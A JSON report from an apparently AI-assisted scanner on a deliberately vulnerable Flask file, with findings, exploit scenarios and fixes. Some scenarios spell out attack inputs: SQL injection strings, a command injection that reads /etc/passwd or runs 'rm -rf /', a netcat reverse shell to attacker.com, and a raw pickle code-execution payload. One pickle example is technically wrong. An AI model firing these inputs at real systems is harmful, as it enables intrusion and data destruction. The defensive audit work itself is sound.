@@ -1,0 +1,271 @@
+{
+  "generated_at": "2026-06-12T14:11:04.228533Z",
+  "repo": "my_vulnerable_code",
+  "semgrep_config": "auto",
+  "summary": {
+    "total_semgrep_findings": 11,
+    "analyzed_findings": 11,
+    "patched_files": 1,
+    "remaining_findings_after_patch": 0
+  },
+  "results": [
+    {
+      "finding": {
+        "rule_id": "python.lang.security.audit.md5-used-as-password.md5-used-as-password",
+        "message": "It looks like MD5 is used as a password hash. MD5 is not considered a secure password hash because it can be cracked by an attacker in a short amount of time. Use a suitable password hashing function such as scrypt. You can use `hashlib.scrypt`.",
+        "severity": "WARNING",
+        "path": "/Users/joshuawijesinghe/agentic-ai-projects/agentic-vuln-ai/my_vulnerable_code/test.py",
+        "start_line": 24,
+        "end_line": 24,
+        "code": "20: # Vulnerability 2: Weak Password Hashing (CWE-328)\n21: # ==========================================================\n22: \n23: def hash_password(password):\n24:     return hashlib.md5(password.encode()).hexdigest()\n25: \n26: \n27: # ==========================================================\n28: # Vulnerability 3: Predictable Random Values (CWE-330)"
+      },
+      "llm_analysis": {
+        "is_true_positive": true,
+        "vulnerability_type": "Weak Password Hashing",
+        "cwe": "CWE-328",
+        "severity": "High",
+        "explanation": "The code uses MD5 (a fast, general-purpose cryptographic hash function) to hash passwords. MD5 is cryptographically broken for password hashing due to its speed, lack of salt, and susceptibility to collision and preimage attacks. Modern hardware (GPUs, ASICs) can brute-force MD5 hashes at extremely high rates (hundreds of gigahashes per second), making password recovery trivial even for moderately complex passwords.",
+        "impact": "If an attacker gains access to the hashed passwords (e.g., via database breach), they can efficiently perform offline brute-force or dictionary attacks to recover plaintext passwords. This compromises user accounts, enables credential stuffing, and may lead to unauthorized access, data exfiltration, or privilege escalation.",
+        "exploit_scenario": "An attacker obtains the hashed password database (e.g., through SQL injection or misconfigured backups). Using precomputed rainbow tables or GPU-accelerated tools like Hashcat, they can crack common passwords (e.g., 'password123') in seconds. Once cracked, the attacker can log in as legitimate users, potentially gaining access to sensitive systems or data.",
+        "remediation": "Replace MD5 with a dedicated password hashing algorithm designed to be slow and resistant to parallelization, such as scrypt, bcrypt, Argon2, or PBKDF2 with a strong work factor. Ensure each password is hashed with a unique, cryptographically random salt (e.g., 16+ bytes). Example using hashlib.scrypt: `hashlib.scrypt(password.encode(), n=16384, r=8, p=1, dklen=32).hex()`.",
+        "confidence": 0.95
+      }
+    },
+    {
+      "finding": {
+        "rule_id": "python.django.security.injection.tainted-sql-string.tainted-sql-string",
+        "message": "Detected user input used to manually construct a SQL string. This is usually bad practice because manual construction could accidentally result in a SQL injection. An attacker could use a SQL injection to steal or modify contents of the database. Instead, use a parameterized query which is available by default in most database engines. Alternatively, consider using the Django object-relational mappers (ORM) instead of raw SQL queries.",
+        "severity": "ERROR",
+        "path": "/Users/joshuawijesinghe/agentic-ai-projects/agentic-vuln-ai/my_vulnerable_code/test.py",
+        "start_line": 46,
+        "end_line": 49,
+        "code": "42: \n43:     conn = sqlite3.connect(\"users.db\")\n44:     cursor = conn.cursor()\n45: \n46:     query = (\n47:         \"SELECT * FROM users \"\n48:         \"WHERE username = '\" + username + \"'\"\n49:     )\n50: \n51:     cursor.execute(query)\n52: \n53:     result = cursor.fetchall()"
+      },
+      "llm_analysis": {
+        "is_true_positive": true,
+        "vulnerability_type": "SQL Injection",
+        "cwe": "CWE-89",
+        "severity": "Critical",
+        "explanation": "The code concatenates user-provided input (username) directly into a SQL query string using string concatenation. This allows an attacker to inject arbitrary SQL code by manipulating the username value (e.g., by including a single quote, UNION SELECT, or other SQL syntax). The query is then executed via cursor.execute(query) without parameterization or sanitization.",
+        "impact": "An attacker could exploit this to read sensitive data (e.g., passwords, personal information), modify or delete database records, bypass authentication, or potentially execute administrative operations on the database depending on the database permissions.",
+        "exploit_scenario": "An attacker submits a username like ' OR '1'='1' --, which results in the query: SELECT * FROM users WHERE username = '' OR '1'='1' --'. This would return all users in the table. More severe payloads could extract data from other tables (e.g., ' UNION SELECT password FROM admin_users --) or perform destructive actions like DROP TABLE.",
+        "remediation": "Use parameterized queries instead of string concatenation. Replace lines 46\u201349 with: cursor.execute(\"SELECT * FROM users WHERE username = ?\", (username,)). Alternatively, use Django's ORM (e.g., User.objects.filter(username=username)) if working within Django.",
+        "confidence": 0.98
+      }
+    },
+    {
+      "finding": {
+        "rule_id": "python.flask.security.injection.tainted-sql-string.tainted-sql-string",
+        "message": "Detected user input used to manually construct a SQL string. This is usually bad practice because manual construction could accidentally result in a SQL injection. An attacker could use a SQL injection to steal or modify contents of the database. Instead, use a parameterized query which is available by default in most database engines. Alternatively, consider using an object-relational mapper (ORM) such as SQLAlchemy which will protect your queries.",
+        "severity": "ERROR",
+        "path": "/Users/joshuawijesinghe/agentic-ai-projects/agentic-vuln-ai/my_vulnerable_code/test.py",
+        "start_line": 46,
+        "end_line": 49,
+        "code": "42: \n43:     conn = sqlite3.connect(\"users.db\")\n44:     cursor = conn.cursor()\n45: \n46:     query = (\n47:         \"SELECT * FROM users \"\n48:         \"WHERE username = '\" + username + \"'\"\n49:     )\n50: \n51:     cursor.execute(query)\n52: \n53:     result = cursor.fetchall()"
+      },
+      "llm_analysis": {
+        "is_true_positive": true,
+        "vulnerability_type": "SQL Injection",
+        "cwe": "CWE-89",
+        "severity": "Critical",
+        "explanation": "The code concatenates user-provided input (username) directly into a SQL query string using string concatenation. This allows an attacker to inject arbitrary SQL code by manipulating the username input (e.g., by including a single quote, UNION SELECT, or comment sequences like '--'). Since the query is executed without parameterization or sanitization, this constitutes a classic SQL injection vulnerability.",
+        "impact": "An attacker could exploit this to read sensitive data (e.g., passwords, personal information), modify or delete database contents, bypass authentication, or potentially execute administrative operations on the database depending on the database permissions. In worst-case scenarios, this could lead to full compromise of the application's data layer.",
+        "exploit_scenario": "An attacker submits a username like ' OR '1'='1' --, which would result in the query: SELECT * FROM users WHERE username = '' OR '1'='1' --'. This query returns all users, potentially exposing all records. More severe payloads (e.g., ' UNION SELECT password FROM users WHERE username='admin' --) could extract specific sensitive fields.",
+        "remediation": "Use parameterized queries with placeholders instead of string concatenation. Replace lines 46\u201349 with: cursor.execute(\"SELECT * FROM users WHERE username = ?\", (username,)). This ensures the input is properly escaped and treated as data, not executable code. Alternatively, use an ORM like SQLAlchemy with parameterized queries.",
+        "confidence": 0.98
+      }
+    },
+    {
+      "finding": {
+        "rule_id": "python.sqlalchemy.security.sqlalchemy-execute-raw-query.sqlalchemy-execute-raw-query",
+        "message": "Avoiding SQL string concatenation: untrusted input concatenated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complex SQL composition, use SQL Expression Language or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option.",
+        "severity": "ERROR",
+        "path": "/Users/joshuawijesinghe/agentic-ai-projects/agentic-vuln-ai/my_vulnerable_code/test.py",
+        "start_line": 51,
+        "end_line": 51,
+        "code": "47:         \"SELECT * FROM users \"\n48:         \"WHERE username = '\" + username + \"'\"\n49:     )\n50: \n51:     cursor.execute(query)\n52: \n53:     result = cursor.fetchall()\n54: \n55:     conn.close()"
+      },
+      "llm_analysis": {
+        "is_true_positive": true,
+        "vulnerability_type": "SQL Injection",
+        "cwe": "CWE-89",
+        "severity": "Critical",
+        "explanation": "The code concatenates the untrusted 'username' variable directly into a raw SQL query string. This allows an attacker to inject arbitrary SQL commands by providing malicious input (e.g., ' OR '1'='1). Since the query is executed via cursor.execute(query) without parameterization, the injected SQL will be processed by the database.",
+        "impact": "Successful exploitation could lead to unauthorized data access, data exfiltration, data modification or deletion, authentication bypass, and potentially full compromise of the underlying database system.",
+        "exploit_scenario": "An attacker submits a username like 'admin'--' or '1'='1' as input. The resulting query becomes: SELECT * FROM users WHERE username = 'admin'--' or '1'='1'. The '--' comments out the rest of the original query, and the '1'='1' condition is always true, potentially returning all users or bypassing authentication.",
+        "remediation": "Use parameterized queries with SQLAlchemy's text() and bindparams() or use SQLAlchemy ORM. For example: from sqlalchemy import text; query = text('SELECT * FROM users WHERE username = :username').bindparams(username=username); cursor.execute(query). This ensures user input is properly escaped and treated as data, not executable code.",
+        "confidence": 0.95
+      }
+    },
+    {
+      "finding": {
+        "rule_id": "python.django.security.injection.command.command-injection-os-system.command-injection-os-system",
+        "message": "Request data detected in os.system. This could be vulnerable to a command injection and should be avoided. If this must be done, use the 'subprocess' module instead and pass the arguments as a list. See https://owasp.org/www-community/attacks/Command_Injection for more information.",
+        "severity": "ERROR",
+        "path": "/Users/joshuawijesinghe/agentic-ai-projects/agentic-vuln-ai/my_vulnerable_code/test.py",
+        "start_line": 66,
+        "end_line": 68,
+        "code": "62: # ==========================================================\n63: \n64: @app.route(\"/ping\")\n65: def ping():\n66:     host = request.args.get(\"host\")\n67: \n68:     os.system(\"ping -c 1 \" + host)\n69: \n70:     return \"done\"\n71: \n72: "
+      },
+      "llm_analysis": {
+        "is_true_positive": true,
+        "vulnerability_type": "OS Command Injection",
+        "cwe": "CWE-78",
+        "severity": "Critical",
+        "explanation": "The code directly concatenates user-supplied input from request.args.get('host') into a shell command string passed to os.system(). This allows an attacker to inject arbitrary shell commands by embedding special characters (e.g., ';', '|', '&', or backticks) in the 'host' parameter, which are interpreted by the shell as command separators or command substitutions.",
+        "impact": "Successful exploitation could lead to full remote code execution on the server, enabling attackers to read/write sensitive files, exfiltrate data, pivot to internal systems, or compromise the host entirely.",
+        "exploit_scenario": "An attacker sends a request to /ping?host=localhost;cat /etc/passwd. The resulting command becomes 'os.system(\"ping -c 1 localhost;cat /etc/passwd\")', causing the system to execute both the ping command and the cat command, leaking sensitive system information.",
+        "remediation": "Replace os.system() with subprocess.run() using a list of arguments (not a string), and validate/sanitize the 'host' input against a strict allowlist (e.g., only alphanumeric characters, dots, hyphens, and underscores). Example: subprocess.run(['ping', '-c', '1', host], check=True). Additionally, avoid passing user input directly to shell commands whenever possible.",
+        "confidence": 0.98
+      }
+    },
+    {
+      "finding": {
+        "rule_id": "python.flask.security.injection.os-system-injection.os-system-injection",
+        "message": "User data detected in os.system. This could be vulnerable to a command injection and should be avoided. If this must be done, use the 'subprocess' module instead and pass the arguments as a list.",
+        "severity": "ERROR",
+        "path": "/Users/joshuawijesinghe/agentic-ai-projects/agentic-vuln-ai/my_vulnerable_code/test.py",
+        "start_line": 68,
+        "end_line": 68,
+        "code": "64: @app.route(\"/ping\")\n65: def ping():\n66:     host = request.args.get(\"host\")\n67: \n68:     os.system(\"ping -c 1 \" + host)\n69: \n70:     return \"done\"\n71: \n72: "
+      },
+      "llm_analysis": {
+        "is_true_positive": true,
+        "vulnerability_type": "OS Command Injection",
+        "cwe": "CWE-78",
+        "severity": "Critical",
+        "explanation": "The code directly concatenates user-supplied input (host parameter from request.args) into a shell command string passed to os.system(). This allows an attacker to inject arbitrary shell commands by including shell metacharacters (e.g., ';', '|', '&', '$()', backticks) in the 'host' parameter. Since os.system() invokes /bin/sh -c, the injected commands will execute with the same privileges as the Flask application.",
+        "impact": "Remote code execution (RCE) with the privileges of the application process. An attacker could read sensitive files, exfiltrate data, install backdoors, pivot to internal systems, or cause denial of service by executing arbitrary system commands.",
+        "exploit_scenario": "An attacker sends a request to /ping?host=localhost;cat /etc/passwd. The resulting command becomes 'ping -c 1 localhost;cat /etc/passwd', causing the system to execute both the ping command and the cat command, leaking /etc/passwd contents to the response or logs.",
+        "remediation": "Replace os.system() with subprocess.run() using a list of arguments to prevent shell interpretation. Validate and sanitize the 'host' input against a strict allowlist (e.g., only alphanumeric characters, dots, hyphens, and limited length). Example: subprocess.run(['ping', '-c', '1', host], check=True). Additionally, consider using a safer alternative like socket or ICMP libraries instead of invoking system commands.",
+        "confidence": 0.98
+      }
+    },
+    {
+      "finding": {
+        "rule_id": "python.lang.security.dangerous-system-call.dangerous-system-call",
+        "message": "Found user-controlled data used in a system call. This could allow a malicious actor to execute commands. Use the 'subprocess' module instead, which is easier to use without accidentally exposing a command injection vulnerability.",
+        "severity": "ERROR",
+        "path": "/Users/joshuawijesinghe/agentic-ai-projects/agentic-vuln-ai/my_vulnerable_code/test.py",
+        "start_line": 68,
+        "end_line": 68,
+        "code": "64: @app.route(\"/ping\")\n65: def ping():\n66:     host = request.args.get(\"host\")\n67: \n68:     os.system(\"ping -c 1 \" + host)\n69: \n70:     return \"done\"\n71: \n72: "
+      },
+      "llm_analysis": {
+        "is_true_positive": true,
+        "vulnerability_type": "Command Injection",
+        "cwe": "CWE-78",
+        "severity": "Critical",
+        "explanation": "The code directly concatenates user-controlled input (host parameter from request.args) into a shell command string passed to os.system(). This allows an attacker to inject arbitrary shell commands by embedding special characters (e.g., ';', '|', '&', or backticks) in the 'host' parameter. For example, a request to /ping?host=example.com;rm -rf / would execute both ping and the destructive rm command.",
+        "impact": "Remote code execution (RCE) on the server. An attacker could steal sensitive data, compromise the system, pivot to other systems, install malware, or cause denial of service.",
+        "exploit_scenario": "An attacker sends a request like /ping?host=example.com;cat /etc/passwd to read sensitive system files, or /ping?host=example.com;nc attacker.com 4444 -e /bin/bash to establish a reverse shell, gaining full control of the server.",
+        "remediation": "Replace os.system() with subprocess.run() using a list of arguments (not a string), and validate/sanitize the input. Example: subprocess.run(['ping', '-c', '1', host], check=True). Additionally, validate 'host' against a strict allowlist (e.g., regex for valid hostname/IP) and avoid shell=True. Prefer input validation and parameterized commands to prevent injection.",
+        "confidence": 0.98
+      }
+    },
+    {
+      "finding": {
+        "rule_id": "python.flask.security.injection.path-traversal-open.path-traversal-open",
+        "message": "Found request data in a call to 'open'. Ensure the request data is validated or sanitized, otherwise it could result in path traversal attacks.",
+        "severity": "ERROR",
+        "path": "/Users/joshuawijesinghe/agentic-ai-projects/agentic-vuln-ai/my_vulnerable_code/test.py",
+        "start_line": 81,
+        "end_line": 81,
+        "code": "77: @app.route(\"/read\")\n78: def read_file():\n79:     filename = request.args.get(\"file\")\n80: \n81:     with open(\"uploads/\" + filename, \"r\") as f:\n82:         return f.read()\n83: \n84: \n85: # =========================================================="
+      },
+      "llm_analysis": {
+        "is_true_positive": true,
+        "vulnerability_type": "Path Traversal",
+        "cwe": "CWE-22",
+        "severity": "High",
+        "explanation": "The code directly concatenates user-controlled input (filename from request.args.get('file')) into a file path used by open(). There is no validation, sanitization, or restriction on the input, allowing an attacker to supply path traversal sequences like '../' to access files outside the intended 'uploads/' directory.",
+        "impact": "An attacker could read arbitrary files on the server filesystem, including sensitive configuration files (e.g., /etc/passwd, .env files, application source code, credentials), leading to information disclosure and potential further compromise of the system.",
+        "exploit_scenario": "An attacker sends a request to /read?file=../../../etc/passwd. The server resolves this to 'uploads/../../../etc/passwd', which simplifies to '/etc/passwd', and returns its contents in the HTTP response.",
+        "remediation": "Validate and sanitize the filename input strictly: (1) Use allowlists for expected filenames or patterns; (2) Resolve the final path and ensure it is within the intended base directory using os.path.realpath() and os.path.commonpath(); (3) Avoid using user input directly in file paths. Example: use werkzeug.utils.secure_filename() for basic sanitization, but combine with path validation to prevent traversal.",
+        "confidence": 0.95
+      }
+    },
+    {
+      "finding": {
+        "rule_id": "python.flask.security.insecure-deserialization.insecure-deserialization",
+        "message": "Detected the use of an insecure deserialization library in a Flask route. These libraries are prone to code execution vulnerabilities. Ensure user data does not enter this function. To fix this, try to avoid serializing whole objects. Consider instead using a serializer such as JSON.",
+        "severity": "ERROR",
+        "path": "/Users/joshuawijesinghe/agentic-ai-projects/agentic-vuln-ai/my_vulnerable_code/test.py",
+        "start_line": 93,
+        "end_line": 93,
+        "code": "89: @app.route(\"/deserialize\", methods=[\"POST\"])\n90: def deserialize():\n91:     data = request.data\n92: \n93:     obj = pickle.loads(data)\n94: \n95:     return str(obj)\n96: \n97: "
+      },
+      "llm_analysis": {
+        "is_true_positive": true,
+        "vulnerability_type": "Insecure Deserialization",
+        "cwe": "CWE-502: Deserialization of Untrusted Data",
+        "severity": "Critical",
+        "explanation": "The code uses Python's pickle.loads() to deserialize user-controlled data (request.data) directly. pickle is inherently unsafe for untrusted input because it can execute arbitrary code during deserialization via maliciously crafted payloads (e.g., using __reduce__ to invoke os.system or other dangerous functions). Since the route accepts POST data without authentication, validation, or sanitization, an attacker can craft a malicious pickle payload to achieve remote code execution (RCE).",
+        "impact": "Remote code execution (RCE) on the server, leading to full system compromise, data exfiltration, service disruption, or lateral movement within the infrastructure.",
+        "exploit_scenario": "An attacker sends a POST request to /deserialize with a malicious pickle payload (e.g., one that constructs a shell command using os.system or spawns a reverse shell). For example, using a payload like: pickle.dumps(__import__('os').system('whoami')). When unpickled, this executes the command on the server.",
+        "remediation": "Avoid using pickle for deserializing untrusted data. Replace pickle with a safe serialization format like JSON. If structured data must be transmitted, explicitly define and validate the expected schema using JSON and reconstruct objects manually. If legacy pickle usage is unavoidable, restrict deserialization to trusted internal systems only and sign/encrypt payloads with cryptographic authentication (e.g., HMAC) to prevent tampering\u2014but even then, prefer JSON or similar. In this case, refactor to parse and validate JSON input instead of raw pickle data.",
+        "confidence": 0.98
+      }
+    },
+    {
+      "finding": {
+        "rule_id": "python.lang.security.deserialization.pickle.avoid-pickle",
+        "message": "Avoid using `pickle`, which is known to lead to code execution vulnerabilities. When unpickling, the serialized data could be manipulated to run arbitrary code. Instead, consider serializing the relevant data as JSON or a similar text-based serialization format.",
+        "severity": "WARNING",
+        "path": "/Users/joshuawijesinghe/agentic-ai-projects/agentic-vuln-ai/my_vulnerable_code/test.py",
+        "start_line": 93,
+        "end_line": 93,
+        "code": "89: @app.route(\"/deserialize\", methods=[\"POST\"])\n90: def deserialize():\n91:     data = request.data\n92: \n93:     obj = pickle.loads(data)\n94: \n95:     return str(obj)\n96: \n97: "
+      },
+      "llm_analysis": {
+        "is_true_positive": true,
+        "vulnerability_type": "Insecure Deserialization",
+        "cwe": "CWE-502: Deserialization of Untrusted Data",
+        "severity": "Critical",
+        "explanation": "The code uses pickle.loads() to deserialize untrusted user-provided data (request.data) directly. The pickle module is inherently unsafe for untrusted input because it can execute arbitrary Python code during deserialization. An attacker can craft a malicious pickle payload that, when unpickled, triggers arbitrary code execution on the server.",
+        "impact": "Remote code execution (RCE) on the server. An attacker could execute arbitrary commands, steal sensitive data, exfiltrate credentials, compromise the host, or pivot to other systems in the network.",
+        "exploit_scenario": "An attacker sends a POST request to /deserialize with a maliciously crafted pickle payload (e.g., using pickle's GLOBAL and REDUCE opcodes to invoke os.system or subprocess). For example, a payload like b'\\x80\\x04\\x95\\x1b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x03os\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x07echo pwned\\x94\\x85\\x94R\\x94.' would execute 'echo pwned' on the server. More dangerous payloads could spawn reverse shells or exfiltrate files.",
+        "remediation": "Replace pickle deserialization with a safe, data-only serialization format such as JSON. Validate and sanitize input if data must be accepted from untrusted sources. If legacy pickle usage is unavoidable (e.g., internal trusted systems), restrict deserialization to a whitelist of safe classes using pickle.Unpickler and override find_class to reject unsafe types\u2014but this is still discouraged for untrusted input. Prefer refactoring to avoid deserializing user-controlled data entirely.",
+        "confidence": 0.98
+      }
+    },
+    {
+      "finding": {
+        "rule_id": "python.flask.security.audit.debug-enabled.debug-enabled",
+        "message": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled as it will leak sensitive information. Instead, consider using Flask configuration variables or setting 'debug' using system environment variables.",
+        "severity": "WARNING",
+        "path": "/Users/joshuawijesinghe/agentic-ai-projects/agentic-vuln-ai/my_vulnerable_code/test.py",
+        "start_line": 112,
+        "end_line": 112,
+        "code": "108:     return temp_name\n109: \n110: \n111: if __name__ == \"__main__\":\n112:     app.run(debug=True)"
+      },
+      "llm_analysis": {
+        "is_true_positive": true,
+        "vulnerability_type": "Debug Mode Enabled in Production",
+        "cwe": "CWE-489: Active Debug Code",
+        "severity": "Medium",
+        "explanation": "The code explicitly enables Flask's debug mode (debug=True) when running the application. While useful during development, debug mode in production exposes sensitive internal details such as stack traces, source code, and environment variables via the interactive debugger ( Werkzeug debugger), which can be triggered by unhandled exceptions. This violates secure deployment practices.",
+        "impact": "If an attacker triggers an exception (e.g., via malformed input), they may gain access to sensitive application internals, including source code, configuration values (e.g., database credentials, API keys), and system paths. This can facilitate further attacks such as remote code execution, data exfiltration, or privilege escalation.",
+        "exploit_scenario": "An attacker sends a request that causes an unhandled exception (e.g., invalid JSON in a POST body). Because debug=True is enabled, Flask/Werkzeug serves an interactive debugger page. The attacker explores the 'Environment' tab to view environment variables, finds a secret key or database password, and uses it to access backend systems or forge sessions.",
+        "remediation": "Set debug=False in production. Use environment variables (e.g., FLASK_DEBUG=0 or a custom APP_DEBUG variable) to control debug mode, and ensure debug mode is only enabled in non-production environments. Example: app.run(debug=os.getenv('FLASK_DEBUG', '0') == '1') with validation that the environment is not production.",
+        "confidence": 0.95
+      }
+    }
+  ],
+  "patched_output": {
+    "path": "results/patched/my_vulnerable_code",
+    "files": [
+      {
+        "file": "results/patched/my_vulnerable_code/test.py",
+        "summary": "Fixed 8 critical and high severity vulnerabilities including weak password hashing (MD5), SQL injection (3 instances), OS command injection (3 instances), path traversal, and insecure deserialization (pickle). Also addressed debug mode enabled in production. Replaced MD5 with scrypt, implemented parameterized queries, used subprocess with argument lists, added path validation, replaced pickle with JSON, and disabled debug mode.",
+        "patch_rationale": "",
+        "remaining_risk": "",
+        "applied": true
+      }
+    ]
+  },
+  "verification": {
+    "total_semgrep_findings_after_patch": 0,
+    "remaining_findings": []
+  }
+}
